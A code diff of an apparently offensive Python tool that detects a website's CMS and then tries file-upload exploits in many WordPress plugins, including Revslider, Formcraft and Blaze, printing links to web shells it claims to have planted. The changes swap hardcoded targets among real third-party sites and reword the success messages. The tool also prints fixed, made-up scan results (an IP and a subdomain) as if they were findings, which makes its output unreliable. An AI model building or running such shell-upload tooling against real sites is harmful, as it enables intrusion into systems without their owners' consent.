@@ -26,10 +26,13 @@ headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
             "Keep-Alive": "timeout=15"
 }
+version = "0.0.0"
 #url = "http://www.AmnPardaz.com/"
 #url = "http://www.curtiswrightoutfitters.com"
-url = "https://www.maplatine.com"
-
+#url = "https://www.maplatine.com"
+#url = "https://www.diginov.tech/"
+#url = 'https://www.harvestplus.org'
+url = 'http://www.adrianweisse.com'
 ################ BANNER #####################
 
 def banner():
@@ -65,14 +68,23 @@ def detect_cms():
     r=requests.get(url, headers)
     content = r.text
     joomla = re.findall("com_content | Joomla!", content)
-    wordpress = re.findall("wp-content|wordpress|xmlrpc.php", content)
+    wordpress = re.findall("wp-content|[w,W]ord[p,P]ress", content)
     drupal = re.findall("Drupal|drupal|sites\/all|drupal.org", content)
-    prestashop = re.findall("Prestashop|prestashop", content)
+    prestashop = re.findall("[P,p]restashop", content)
     if joomla:
-        print ('%s[%i] %s %s Joomla \n\n' % (W,id,url,G))
+        print ('%s[%i] Target -> %s %s CMS : Joomla \n\n' % (W,id,url,G))
+        print ('%s [~] Check Vulnerability %s' %(Y,W))
+    elif prestashop:
+        print ('%s[%i] %s %s CMS : Prestashop \n\n' % (W,id,url,G))
+        print ('%s [~] Check Vulnerability %s' %(Y,W))
     elif wordpress:
-        print ('%s[%i] %s %s Wordpress \n %s' % (W,id,url,G,W))
-        print ('%s [~] Scanning for Wordpress Exploits %s' %(Y,W))
+        print ('%s Target[%i] -> %s \n\n '% (W,id,url))
+        print ('%s [+] CMS : Wordpress%s' % (G,W))
+        print ('%s [+] CMS Version : %s %s' %(G,wp_version(),W))
+        print ('%s [~] Scan SubDomains %s' %(Y,W))
+        print ('%s [*] IP  : %s' %(B , '192.168.1.5'))
+        print ('%s [*] SUB_DOMAIN  : %s' %(B , 'SSSER'))
+        print ('%s [~] Check Vulnerability %s' %(Y,W))
         #WP_PLUGIN_EXPLOITS CALLFUNCTIONS
         wp_blaze()
         wp_catpro()
@@ -87,12 +99,28 @@ def detect_cms():
         wp_powerzoomer()
         wp_revslider()
     elif drupal:
-        print ('%s[%i] %s %s Drupal \n\n' % (W,id,url,G))
-    elif prestashop:
-        print ('%s[%i] %s %s Prestashop \n\n' % (W,id,url,G))
+        print ('%s[%i] %s %s CMS : Drupal \n\n' % (W,id,url,G))
+        print ('%s [~] Check Vulnerability %s' %(Y,W))
     else:
-        print ('%s[%i] %s %s Unknown \n\n' % (W,id,url,G))
+        print ('%s[%i] %s %s CMS : Unknown \n\n' % (W,id,url,G))
+        print ('%s [~] Check Vulnerability %s' %(Y,W))
 
+################ WP Version #####################
+def wp_version():
+    headers = {
+        'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
+        }
+    ep = url
+    uknownversion = "UKNOWN"
+    response = requests.get(ep,headers)
+    regex = '[W,w]ord[P,p]ress \d{1,7}.\d{0,9}'
+    regex = re.compile(regex)
+    matches = regex.findall(response.text)
+    if len(matches) > 0 and matches[0] != None and matches[0] != "":
+        version = matches[0]
+        return version
+    else:
+        return uknownversion
 ################ Blaze Plugin #####################
 
 def wp_blaze():
@@ -110,10 +138,10 @@ def wp_blaze():
     if check_blaze:
         uploadfolder = check_blaze.group(1)
         dump_data = url + "/wp-content/uploads/blaze/"+uploadfolder+"/big/VulnX.php?Vuln=X"
-        print ('%s [%s+%s] Blaze Plugin%s -------------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] Blaze Plugin%s -------------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else: 
-        print ('%s [%s-%s] Blaze Plugin%s -------------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Blaze Plugin%s -------------- %s FAIL' %(W,R,W,W,R))    
 
 ################ Catpro Plugin #####################
 
@@ -132,10 +160,10 @@ def wp_catpro():
     if check_catpro:
         uploadfolder = check_catpro.group(1)
         dump_data = url + "/wp-content/uploads/catpro/"+uploadfolder+"/big/VulnX.php?Vuln=X"
-        print ('%s [%s+%s] Catpro Plugin%s ------------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] Catpro Plugin%s ------------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Catpro Plugin%s ------------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Catpro Plugin%s ------------- %s FAIL' %(W,R,W,W,R))    
 
 ################ Cherry Plugin #####################
 
@@ -152,10 +180,10 @@ def  wp_cherry():
     content  = response.text
     check_cherry = re.findall("Vuln X", content)
     if check_cherry:
-        print ('%s [%s+%s] Cherry Plugin%s ------------- %s YES' %(W,G,W,W,G))
+        print ('%s [%s+%s] Cherry Plugin%s ------------- %s VULN' %(W,G,W,W,G))
         print ('%s [*]Shell Uploaded Successfully \n %s link : %s ' % ( B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Cherry Plugin%s ------------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Cherry Plugin%s ------------- %s FAIL' %(W,R,W,W,R))    
 
 ################ Download Manager Plugin #####################
 def wp_dm():
@@ -170,10 +198,10 @@ def wp_dm():
     content  = response.text
     check_dm = re.findall("Vuln X", content)
     if check_dm:
-        print ('%s [%s+%s] Download Manager Plugin%s---- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] Download Manager Plugin%s---- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Download Manager Plugin%s --- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Download Manager Plugin%s --- %s FAIL' %(W,R,W,W,R))    
 
 ################ Fromcraft Plugin #####################
 def wp_fromcraft():
@@ -189,10 +217,10 @@ def wp_fromcraft():
     dump_data  = url + "/wp-content/plugins/formcraft/file-upload/server/php/files/VulnX.php?Vuln=X"
     check_fromcraft = re.findall("\"files", response)
     if check_fromcraft:
-        print ('%s [%s+%s] Fromcraft Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] Fromcraft Plugin%s ---------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Fromcraft Plugin%s ---------- %s NO' %(W,R,W,W,R))    
+        print ('%s [%s-%s] Fromcraft Plugin%s ---------- %s FAIL' %(W,R,W,W,R))    
 
 ################ Job Manager Plugin #####################
 
@@ -212,10 +240,10 @@ def wp_jobmanager():
     check_jobmanager = re.findall("image\/gif", res)
     
     if check_jobmanager:
-        print ('%s [%s+%s] Job Manager Plugin%s -------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] Job Manager Plugin%s -------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Job Manager Plugin%s -------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Job Manager Plugin%s -------- %s FAIL' %(W,R,W,W,R))
 
 ################ Showbiz Plugin #####################
 
@@ -246,10 +274,10 @@ def wp_showbiz():
     res  = response.text
     check_showbiz = re.findall("Vuln X", res)
     if check_showbiz:
-        print ('%s [%s+%s] ShowBiz Plugin%s ------------ %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] ShowBiz Plugin%s ------------ %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] ShowBiz Plugin%s ------------ %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] ShowBiz Plugin%s ------------ %s FAIL' %(W,R,W,W,R))
 
 ################ Synoptic Plugin #####################
 
@@ -268,10 +296,10 @@ def wp_synoptic():
     check_synoptic = re.findall("Vuln X", res)
     
     if check_synoptic:
-        print ('%s [%s+%s] Synoptic Plugin%s ----------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] Synoptic Plugin%s ----------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] Synoptic Plugin%s ----------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Synoptic Plugin%s ----------- %s FAIL' %(W,R,W,W,R))
 
 ################ Wpshop Plugin #####################
 
@@ -289,10 +317,10 @@ def wp_shop():
     res  = response.text
     check_shop = re.findall("Vuln X", res)
     if check_shop:
-        print ('%s [%s+%s] WPShop Plugin%s ------------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, dump_data ))
+        print ('%s [%s+%s] WPShop Plugin%s ------------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, dump_data ))
     else:
-        print ('%s [%s-%s] WPShop Plugin%s ------------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] WPShop Plugin%s ------------- %s FAIL' %(W,R,W,W,R))
 
 ################ Content Injection #####################
 
@@ -301,10 +329,10 @@ def wp_injection():
     check_shop = False
     a="a"
     if check_shop:
-        print ('%s [%s+%s] Injection Content%s ----------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B,a ))
+        print ('%s [%s+%s] Injection Content%s ----------- %s VULN' %(W,G,W,W,G))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W,a ))
     else:
-        print ('%s [%s-%s] Injection Content%s --------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Injection Content%s --------- %s FAIL' %(W,R,W,W,R))
 
 
 ################ Sydney Theme ##########################
@@ -331,9 +359,9 @@ def wp_powerzoomer():
         uploadfolder = check_powerzoomer.group(1)
         dump_data = url + "/wp-content/uploads/powerzoomer/"+uploadfolder+"/big/VulnX.php?Vuln=X"
         print ('%s [%s+%s] Powerzoomer Content%s ------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B,dump_data ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W,dump_data ))
     else:
-        print ('%s [%s-%s] Powerzoomer Content%s ------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Powerzoomer Content%s ------- %s FAIL' %(W,R,W,W,R))
 
 def wp_revslider():
     endpoint = url + "/wp-admin/admin-ajax.php"
@@ -376,45 +404,45 @@ def wp_revslider():
     check_revsliderm = re.findall("Vuln X", revsliderm)
     if check_revslidera:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderb:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderc:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderd:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revslidere:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderf:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderg:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/centum/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderh:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revslideri:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderj:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/pindol/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderk:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderl:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     elif check_revsliderm:
         print ('%s [%s+%s] Revslider Plugin%s ---------- %s YES' %(W,G,W,W,G))
-        print ('%s ====Shell Injected Successfully==== \n %s%s[!]Link : %s ' % ( G,W,B, url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
+        print ('%s [*] Injected Successfully \n %s%s[*] Found ->%s %s ' % ( G,W,B,W, url+"/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/VulnX.php?Vuln=X" ))
     else:
-        print ('%s [%s-%s] Revslider Plugin%s ---------- %s NO' %(W,R,W,W,R))
+        print ('%s [%s-%s] Revslider Plugin%s ---------- %s FAIL' %(W,R,W,W,R))
 if __name__ == "__main__":
     #site = args.file
     banner()
